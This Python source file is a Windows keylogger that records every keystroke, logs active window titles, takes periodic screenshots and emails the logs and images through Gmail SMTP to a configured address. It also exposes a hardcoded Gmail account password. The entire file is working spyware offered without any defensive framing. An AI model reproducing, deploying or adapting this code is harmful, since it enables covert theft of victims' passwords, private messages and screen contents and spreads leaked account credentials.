import os
import smtplib
import sys
import threading
from configparser import ConfigParser
from ctypes import windll, create_unicode_buffer
from email import encoders
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Optional
import pyautogui
import time
from pynput.keyboard import Key, Listener

logCount = 0
screens = 0
report_timer_count = 0
screenshot_timer_count = 0
tab_change_count = 0
exit_hotkey = []
stop_threads = False


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


parser = ConfigParser()
parser.read(resource_path("config.ini"))
report_interval = int(parser.get('settings', 'report_interval'))
screenshot_interval = int(parser.get('settings', 'screenshot_interval'))
email_address = parser.get('settings', 'email_address')
char_count_toScreenshot = int(parser.get('settings', 'char_count_toScreenshot'))
screenshot_per_tabChange = parser.get('settings', 'screenshot_per_tabChange')
if screenshot_per_tabChange.lower() == "true":
    screenshot_per_tabChange = True
else:
    screenshot_per_tabChange = False


def getForegroundWindowTitle() -> Optional[str]:
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)

    # 1-liner alternative: return buf.value if buf.value else None
    if buf.value:
        return buf.value
    else:
        return None


currentActiveWindow = str(getForegroundWindowTitle())


def sendMail():
    global screens, email_address
    email_user = "nenthity@gmail.com"
    email_send = email_address
    screenshots = []
    screens_copy = screens
    while screens != 0:
        screenshots.append("screenshot" + str(screens) + ".png")
        screens -= 1
    screenshots.sort()

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = "Log Report"

    body = "Log report #" + str(logCount)
    msg.attach(MIMEText(body, 'plain'))

    for s in screenshots:
        # for screenshots
        attachment = open(resource_path(s), 'rb')
        image = MIMEImage(attachment.read(), name=os.path.basename(s))
        msg.attach(image)
    # for log
    filename = resource_path("log.txt")
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + os.path.basename(filename))
    msg.attach(part)

    text = msg.as_string()

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_user, "123SrettawsreaG!@#")

        server.sendmail(email_user, email_send, text)
        server.quit()
        for s in screenshots:
            os.remove(resource_path(s))
    except Exception as e:
        screens = screens_copy


def screenshot():
    global screens
    image = pyautogui.screenshot()
    screens += 1
    image.save(resource_path("screenshot" + str(screens) + ".png"))


def on_press(key):
    global exit_hotkey
    if key == Key.ctrl_r:
        exit_hotkey.append(key)
    elif key == Key.delete:
        exit_hotkey.append(key)
    elif key == Key.end:
        exit_hotkey.append(key)
    else:
        exit_hotkey.clear()
    write_file(key)


def on_release(key):
    global logCount, stop_threads
    if len(exit_hotkey) > 1:
        stop_threads = True
        with open("log.txt", 'a') as f:
            f.write("\n - - - - - - - - - - - - - - -  E X I T  - - - - - - - - - - - - - - - \n")
            logCount += 1
        if exit_hotkey[1] == Key.delete:
            sendMail()
            os.remove(resource_path("log.txt"))
        os._exit(0)
        return False
    if str(key).find("shift") >= 0:
        with open("log.txt", 'a') as f:
            f.write(" |" + str(key)[4:] + "RELEASED" + "| ")
    if str(key).find("ctrl") >= 0:
        with open("log.txt", 'a') as f:
            f.write(" |" + str(key)[4:] + "RELEASED" + "| ")


def write_file(key):
    global char_count_toScreenshot
    mode = "w"
    if os.path.exists('log.txt'):
        mode = "a"
    with open(resource_path("log.txt"), mode) as f:
        with open(resource_path("log.txt"), 'r') as g:
            lines = g.readlines()
            line = []
            if len(lines) != 0:
                line = lines[len(lines) - 1]
        if len(line) >= char_count_toScreenshot:
            f.write("\n")
            f.write(" - - - - - " + time.ctime() + " - - - - - ")
            screenshot()
            f.write("\n")
        k = str(key)
        if str(key).find("'") >= 0:
            k = str(key).replace("'", "")
        if str(key).find("space") > 0:
            k = " "
        if str(key).find("backspace") >= 0:
            with open(resource_path("log.txt"), 'rb+') as h:
                h.seek(-1, os.SEEK_END)
                h.truncate()
            k = ""
        if key == Key.tab or key == Key.caps_lock or str(key).find("shift") >= 0 or str(key).find("ctrl") >= 0 or str(key).find("alt") >= 0:
            k = " |" + str(key)[4:] + "| "
        if key == Key.esc:
            k = ""
        f.write(k)


def report_timer():
    global logCount, report_timer_count, tab_change_count, stop_threads
    if report_timer_count > 0:
        logCount += 1
        sendMail()
    else:
        report_timer_count += 1
    if os.path.exists(resource_path("log.txt")):
        try:
            os.remove(resource_path("log.txt"))
        except PermissionError:
            pass
    tab_change_count = 0
    thread = threading.Timer(report_interval, report_timer)
    thread.start()
    if stop_threads:
        thread.cancel()


def screenshot_timer():
    global screenshot_timer_count
    if screenshot_timer_count > 0:
        screenshot()
    else:
        screenshot_timer_count += 1
    thread = threading.Timer(screenshot_interval, screenshot_timer)
    thread.start()
    if stop_threads:
        thread.cancel()


def tabChange():
    global currentActiveWindow, tab_change_count, screenshot_per_tabChange
    if currentActiveWindow != str(getForegroundWindowTitle()) or tab_change_count == 0:
        tab_change_count += 1
        currentActiveWindow = str(getForegroundWindowTitle())
        mode = "w"
        if os.path.exists("log.txt"):
            mode = "a"
        with open(resource_path("log.txt"), mode) as f:
            f.write("\n")
            f.write(" - - - - - " + time.ctime() + " - - - - - ")
            if screenshot_per_tabChange:
                screenshot()
            f.write(str(getForegroundWindowTitle()))
            f.write("\n")

    thread = threading.Timer(1, tabChange)
    thread.start()
    if stop_threads:
        thread.cancel()


report_timer()
tabChange()
screenshot_timer()
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()